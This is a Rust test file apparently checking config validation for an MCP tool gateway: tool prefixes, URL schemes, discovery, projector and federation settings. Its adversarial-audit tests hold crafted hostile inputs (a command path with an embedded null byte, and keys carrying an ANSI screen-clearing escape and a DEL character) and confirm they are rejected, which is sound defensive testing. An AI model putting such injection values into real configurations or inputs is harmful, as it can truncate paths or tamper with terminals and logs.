        backends: vec![crate::BackendConfig {
            id: "a".to_string(),
            url: "http://a:8000".to_string(),
            tool_prefixes: vec!["fs_".to_string(), "".to_string()],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("tool_prefixes") && err.contains("must not be empty"),
        "expected empty tool_prefix error: {}",
        err
    );
}

/// FIND-R43-005: Too-long tool_prefix rejected.
#[test]
fn test_r43_005_tool_prefix_too_long_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "a".to_string(),
            url: "http://a:8000".to_string(),
            tool_prefixes: vec!["x".repeat(257)],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("max length"),
        "expected max length error: {}",
        err
    );
}

/// FIND-R43-005: Unique tool_prefixes across backends pass.
#[test]
fn test_r43_005_unique_tool_prefixes_pass() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![
            crate::BackendConfig {
                id: "a".to_string(),
                url: "http://a:8000".to_string(),
                tool_prefixes: vec!["fs_".to_string(), "file_".to_string()],
                weight: 100,
                transport_urls: std::collections::HashMap::new(),
            },
            crate::BackendConfig {
                id: "b".to_string(),
                url: "http://b:8000".to_string(),
                tool_prefixes: vec!["db_".to_string()],
                weight: 100,
                transport_urls: std::collections::HashMap::new(),
            },
        ],
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════
// ADVERSARIAL AUDIT ROUND 44 TESTS
// ═══════════════════════════════════════════════════

/// FIND-R44-005: stdio_command with null byte rejected.
#[test]
fn test_stdio_command_null_byte_rejected() {
    let config = crate::TransportConfig {
        stdio_command: Some("/usr/bin/safe\0_path".to_string()),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("null byte"), "got: {}", err);
}

/// FIND-R44-006: Backend URL with mixed-case scheme accepted.
#[test]
fn test_gateway_backend_url_mixed_case_scheme() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "test".to_string(),
            url: "HTTP://localhost:8080/mcp".to_string(),
            tool_prefixes: vec![],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    assert!(config.validate().is_ok(), "mixed-case HTTP should be accepted");
}

/// FIND-R44-006: transport_urls with mixed-case WS scheme accepted.
#[test]
fn test_gateway_transport_url_mixed_case_ws() {
    let mut transport_urls = std::collections::HashMap::new();
    transport_urls.insert(
        vellaveto_types::TransportProtocol::WebSocket,
        "WS://localhost:8080/ws".to_string(),
    );
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "test".to_string(),
            url: "http://localhost:8080/mcp".to_string(),
            tool_prefixes: vec![],
            weight: 100,
            transport_urls,
        }],
        ..Default::default()
    };
    assert!(config.validate().is_ok(), "mixed-case WS should be accepted");
}

/// FIND-R44-007: Glob key with ASCII control characters rejected.
#[test]
fn test_transport_overrides_control_chars_rejected() {
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "tool_\x1B[2Jclear".to_string(), // ANSI escape code
        vec![vellaveto_types::TransportProtocol::Http],
    );
    let config = crate::TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("control characters"), "got: {}", err);
}

/// FIND-R44-007: Glob key with DEL (0x7F) rejected.
#[test]
fn test_transport_overrides_del_char_rejected() {
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "tool_\x7F".to_string(),
        vec![vellaveto_types::TransportProtocol::Http],
    );
    let config = crate::TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("control characters"), "got: {}", err);
}

// ═══════════════════════════════════════════════════
// MCP 2025-11-25 StreamableHttpConfig (Phase 30)
// ═══════════════════════════════════════════════════

#[test]
fn test_streamable_http_config_defaults() {
    let config = crate::StreamableHttpConfig::default();
    assert!(!config.resumability_enabled);
    assert!(!config.strict_tool_name_validation);
    assert_eq!(config.max_event_id_length, 128);
    assert_eq!(config.sse_retry_ms, None);
    assert!(config.validate().is_ok());
}

#[test]
fn test_streamable_http_config_max_event_id_length_zero_rejected() {
    let config = crate::StreamableHttpConfig {
        max_event_id_length: 0,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_event_id_length"), "got: {}", err);
}

#[test]
fn test_streamable_http_config_max_event_id_length_over_512_rejected() {
    let config = crate::StreamableHttpConfig {
        max_event_id_length: 513,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_event_id_length"), "got: {}", err);
}

#[test]
fn test_streamable_http_config_max_event_id_length_boundary_accepted() {
    for len in [1, 512] {
        let config = crate::StreamableHttpConfig {
            max_event_id_length: len,
            ..Default::default()
        };
        assert!(config.validate().is_ok(), "len={} should be valid", len);
    }
}

#[test]
fn test_streamable_http_config_sse_retry_ms_bounds() {
    // Below minimum
    let config = crate::StreamableHttpConfig {
        sse_retry_ms: Some(99),
        ..Default::default()
    };
    assert!(config.validate().is_err());

    // Above maximum
    let config = crate::StreamableHttpConfig {
        sse_retry_ms: Some(60_001),
        ..Default::default()
    };
    assert!(config.validate().is_err());

    // At boundaries
    for ms in [100, 60_000] {
        let config = crate::StreamableHttpConfig {
            sse_retry_ms: Some(ms),
            ..Default::default()
        };
        assert!(config.validate().is_ok(), "ms={} should be valid", ms);
    }
}

#[test]
fn test_streamable_http_config_serde_roundtrip() {
    let config = crate::StreamableHttpConfig {
        resumability_enabled: true,
        strict_tool_name_validation: true,
        max_event_id_length: 256,
        sse_retry_ms: Some(5000),
    };
    let json = serde_json::to_string(&config).expect("serialize");
    let deser: crate::StreamableHttpConfig = serde_json::from_str(&json).expect("deserialize");
    assert_eq!(config, deser);
}

#[test]
fn test_streamable_http_config_in_policy_config() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [streamable_http]
        resumability_enabled = true
        strict_tool_name_validation = true
        max_event_id_length = 256
        sse_retry_ms = 3000
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    assert!(config.streamable_http.resumability_enabled);
    assert!(config.streamable_http.strict_tool_name_validation);
    assert_eq!(config.streamable_http.max_event_id_length, 256);
    assert_eq!(config.streamable_http.sse_retry_ms, Some(3000));
}

// ═══════════════════════════════════════════════════════════════════════════════
// DISCOVERY CONFIG (Phase 34)
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_discovery_config_defaults() {
    let config = crate::DiscoveryConfig::default();
    assert!(!config.enabled);
    assert_eq!(config.max_results, 5);
    assert_eq!(config.default_ttl_secs, 300);
    assert_eq!(config.max_index_entries, 10_000);
    assert!((config.min_relevance_score - 0.1).abs() < f64::EPSILON);
    assert!(config.token_budget.is_none());
    assert!(config.auto_index_on_tools_list);
}

#[test]
fn test_discovery_config_validate_default_passes() {
    let config = crate::DiscoveryConfig::default();
    config.validate().unwrap();
}

#[test]
fn test_discovery_config_validate_max_results_zero() {
    let mut config = crate::DiscoveryConfig::default();
    config.max_results = 0;
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_results"), "got: {}", err);
}

#[test]
fn test_discovery_config_validate_max_results_exceeds() {
    let mut config = crate::DiscoveryConfig::default();
    config.max_results = 100;
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_results"), "got: {}", err);
}

#[test]
fn test_discovery_config_validate_ttl_zero() {
    let mut config = crate::DiscoveryConfig::default();
    config.default_ttl_secs = 0;
    let err = config.validate().unwrap_err();
    assert!(err.contains("default_ttl_secs"), "got: {}", err);
}

#[test]
fn test_discovery_config_validate_ttl_exceeds() {
    let mut config = crate::DiscoveryConfig::default();
    config.default_ttl_secs = 100_000;
    let err = config.validate().unwrap_err();
    assert!(err.contains("default_ttl_secs"), "got: {}", err);
}

#[test]
fn test_discovery_config_validate_index_entries_zero() {
    let mut config = crate::DiscoveryConfig::default();
    config.max_index_entries = 0;
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_index_entries"), "got: {}", err);
}

#[test]
fn test_discovery_config_validate_index_entries_exceeds() {
    let mut config = crate::DiscoveryConfig::default();
    config.max_index_entries = 100_000;
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_index_entries"), "got: {}", err);
}

#[test]
fn test_discovery_config_validate_min_relevance_nan() {
    let mut config = crate::DiscoveryConfig::default();
    config.min_relevance_score = f64::NAN;
    let err = config.validate().unwrap_err();
    assert!(err.contains("min_relevance_score"), "got: {}", err);
}

#[test]
fn test_discovery_config_validate_min_relevance_negative() {
    let mut config = crate::DiscoveryConfig::default();
    config.min_relevance_score = -0.1;
    let err = config.validate().unwrap_err();
    assert!(err.contains("min_relevance_score"), "got: {}", err);
}

#[test]
fn test_discovery_config_validate_min_relevance_exceeds_one() {
    let mut config = crate::DiscoveryConfig::default();
    config.min_relevance_score = 1.1;
    let err = config.validate().unwrap_err();
    assert!(err.contains("min_relevance_score"), "got: {}", err);
}

#[test]
fn test_discovery_config_validate_token_budget_zero() {
    let mut config = crate::DiscoveryConfig::default();
    config.token_budget = Some(0);
    let err = config.validate().unwrap_err();
    assert!(err.contains("token_budget"), "got: {}", err);
}

#[test]
fn test_discovery_config_validate_token_budget_exceeds() {
    let mut config = crate::DiscoveryConfig::default();
    config.token_budget = Some(2_000_000);
    let err = config.validate().unwrap_err();
    assert!(err.contains("token_budget"), "got: {}", err);
}

#[test]
fn test_discovery_config_serde_roundtrip() {
    let config = crate::DiscoveryConfig {
        enabled: true,
        max_results: 10,
        default_ttl_secs: 600,
        max_index_entries: 5_000,
        min_relevance_score: 0.2,
        token_budget: Some(50_000),
        auto_index_on_tools_list: false,
    };
    let json = serde_json::to_string(&config).unwrap();
    let parsed: crate::DiscoveryConfig = serde_json::from_str(&json).unwrap();
    assert_eq!(config, parsed);
}

#[test]
fn test_discovery_config_in_policy_config() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [discovery]
        enabled = true
        max_results = 10
        default_ttl_secs = 600
        min_relevance_score = 0.2
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    assert!(config.discovery.enabled);
    assert_eq!(config.discovery.max_results, 10);
    assert_eq!(config.discovery.default_ttl_secs, 600);
    assert!((config.discovery.min_relevance_score - 0.2).abs() < f64::EPSILON);
}

#[test]
fn test_discovery_config_policy_config_validate_passes() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [discovery]
        enabled = true
        max_results = 5
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    config.validate().unwrap();
}

#[test]
fn test_discovery_config_policy_config_validate_rejects_invalid() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [discovery]
        enabled = true
        max_results = 100
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    let err = config.validate().unwrap_err();
    assert!(err.contains("discovery"), "got: {}", err);
}

// ═══════════════════════════════════════════════════════════════════════════════
// PROJECTOR CONFIG TESTS (Phase 35.1)
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_projector_config_default() {
    let config = crate::ProjectorConfig::default();
    assert!(!config.enabled);
    assert_eq!(config.default_model_family, "generic");
    assert!(config.auto_detect_model);
    assert!(!config.compress_schemas);
    assert!(config.max_schema_tokens.is_none());
    assert!(config.repair_malformed_calls);
}

#[test]
fn test_projector_config_validate_valid_families() {
    for family in &["claude", "openai", "deepseek", "qwen", "generic"] {
        let config = crate::ProjectorConfig {
            default_model_family: family.to_string(),
            ..Default::default()
        };
        config.validate().unwrap();
    }
}

#[test]
fn test_projector_config_validate_custom_family() {
    let config = crate::ProjectorConfig {
        default_model_family: "custom:llama".to_string(),
        ..Default::default()
    };
    config.validate().unwrap();
}

#[test]
fn test_projector_config_validate_invalid_family() {
    let config = crate::ProjectorConfig {
        default_model_family: "invalid_family".to_string(),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("default_model_family"), "got: {}", err);
}

#[test]
fn test_projector_config_validate_max_schema_tokens_zero() {
    let config = crate::ProjectorConfig {
        max_schema_tokens: Some(0),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_schema_tokens"), "got: {}", err);
}

#[test]
fn test_projector_config_validate_max_schema_tokens_exceeds() {
    let config = crate::ProjectorConfig {
        max_schema_tokens: Some(2_000_000),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_schema_tokens"), "got: {}", err);
}

#[test]
fn test_projector_config_validate_max_schema_tokens_valid() {
    let config = crate::ProjectorConfig {
        max_schema_tokens: Some(500_000),
        ..Default::default()
    };
    config.validate().unwrap();
}

#[test]
fn test_projector_config_validate_max_schema_tokens_none() {
    let config = crate::ProjectorConfig {
        max_schema_tokens: None,
        ..Default::default()
    };
    config.validate().unwrap();
}

#[test]
fn test_projector_config_serde_roundtrip() {
    let config = crate::ProjectorConfig {
        enabled: true,
        default_model_family: "claude".to_string(),
        auto_detect_model: false,
        compress_schemas: true,
        max_schema_tokens: Some(100_000),
        repair_malformed_calls: false,
    };
    let json = serde_json::to_string(&config).unwrap();
    let parsed: crate::ProjectorConfig = serde_json::from_str(&json).unwrap();
    assert_eq!(config, parsed);
}

#[test]
fn test_projector_config_in_policy_config() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [projector]
        enabled = true
        default_model_family = "openai"
        auto_detect_model = false
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    assert!(config.projector.enabled);
    assert_eq!(config.projector.default_model_family, "openai");
    assert!(!config.projector.auto_detect_model);
}

#[test]
fn test_projector_config_policy_config_validate_passes() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [projector]
        enabled = true
        default_model_family = "deepseek"
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    config.validate().unwrap();
}

#[test]
fn test_projector_config_policy_config_validate_rejects_invalid() {
    let toml_str = r#"
        [[policies]]
        name = "test"
        tool_pattern = "*"
        function_pattern = "*"
        policy_type = "Allow"

        [projector]
        enabled = true
        default_model_family = "gpt4"
    "#;
    let config: crate::PolicyConfig = toml::from_str(toml_str).expect("parse");
    let err = config.validate().unwrap_err();
    assert!(err.contains("projector"), "got: {}", err);
}

// ═══════════════════════════════════════════════════════════════════════════════
// FEDERATION CONFIG TESTS (Phase 39)
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_federation_config_default_ttl_values() {
    let config = crate::abac::FederationConfig::default();
    assert_eq!(config.jwks_cache_ttl_secs, 300);
    assert_eq!(config.jwks_fetch_timeout_secs, 10);
    assert!(!config.enabled);
    assert!(config.trust_anchors.is_empty());
}

#[test]
fn test_federation_config_validation_ttl_too_low() {
    let mut config = AbacConfig::default();
    config.enabled = true;
    config.federation.enabled = true;
    config.federation.jwks_cache_ttl_secs = 5; // below min 60 (FIND-R50-017)
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("jwks_cache_ttl_secs"));
}

#[test]
fn test_federation_config_validation_duplicate_org_id() {
    let mut config = AbacConfig::default();
    config.enabled = true;
    config.federation.enabled = true;
    let anchor = vellaveto_types::FederationTrustAnchor {
        org_id: "org-1".to_string(),
        display_name: "Org 1".to_string(),
        jwks_uri: Some("https://keys.example.com/jwks".to_string()),
        issuer_pattern: "https://auth.example.com".to_string(),
        identity_mappings: vec![],
        trust_level: "limited".to_string(),
    };
    config.federation.trust_anchors = vec![anchor.clone(), anchor];
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("duplicate"));
}

#[test]
fn test_federation_config_validation_valid() {
    let mut config = AbacConfig::default();
    config.enabled = true;
    config.federation.enabled = true;
    config.federation.jwks_cache_ttl_secs = 600;
    config.federation.jwks_fetch_timeout_secs = 15;
    config.federation.trust_anchors = vec![vellaveto_types::FederationTrustAnchor {
        org_id: "org-1".to_string(),
        display_name: "Partner Org".to_string(),
        jwks_uri: Some("https://keys.example.com/jwks".to_string()),
        issuer_pattern: "https://auth.example.com".to_string(),
        identity_mappings: vec![],
        trust_level: "limited".to_string(),
    }];
    // Should pass validation (valid TTLs, no duplicate org_ids)
    assert!(config.validate().is_ok());
}
